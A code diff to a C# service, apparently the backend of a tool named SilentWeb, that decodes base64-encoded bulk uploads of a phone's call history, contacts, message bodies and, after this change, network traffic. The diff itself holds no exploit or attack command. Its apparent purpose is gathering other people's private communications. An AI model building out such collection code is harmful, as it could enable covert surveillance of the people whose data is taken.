@@ -46,7 +46,6 @@ namespace SilentWeb.Services
                         bulkData.CallHistory.Calls[i].Duration = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(MakeUrlUnsafe(bulkData.CallHistory.Calls[i].Duration)));
                         bulkData.CallHistory.Calls[i].Number = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(MakeUrlUnsafe(bulkData.CallHistory.Calls[i].Number)));
                     }
-                    bulkData.CallHistory.Hash = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(MakeUrlUnsafe(bulkData.CallHistory.Hash)));
                 }
 
                 if (DataChecker.CheckContacts(bulkData.Contacts))
@@ -56,7 +55,6 @@ namespace SilentWeb.Services
                         bulkData.Contacts.ContactList[i].Name = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(MakeUrlUnsafe(bulkData.Contacts.ContactList[i].Name)));
                         bulkData.Contacts.ContactList[i].Number = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(MakeUrlUnsafe(bulkData.Contacts.ContactList[i].Number)));
                     }
-                    bulkData.Contacts.Hash = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(MakeUrlUnsafe(bulkData.Contacts.Hash)));
                 }
 
                 if (DataChecker.CheckMessages(bulkData.Messages))
@@ -69,6 +67,12 @@ namespace SilentWeb.Services
                         bulkData.Messages.Messages[i].Type = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(MakeUrlUnsafe(bulkData.Messages.Messages[i].Type)));
                         bulkData.Messages.Messages[i].Body = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(MakeUrlUnsafe(bulkData.Messages.Messages[i].Body)));
                     }
+                }
+
+                if (DataChecker.CheckTrafic(bulkData.Trafic))
+                {
+                    bulkData.Trafic.Trafic = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(MakeUrlUnsafe(bulkData.Trafic.Trafic)));
+                    bulkData.Trafic.Hash = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(MakeUrlUnsafe(bulkData.Trafic.Hash)));
                 }
                 return bulkData;
             }
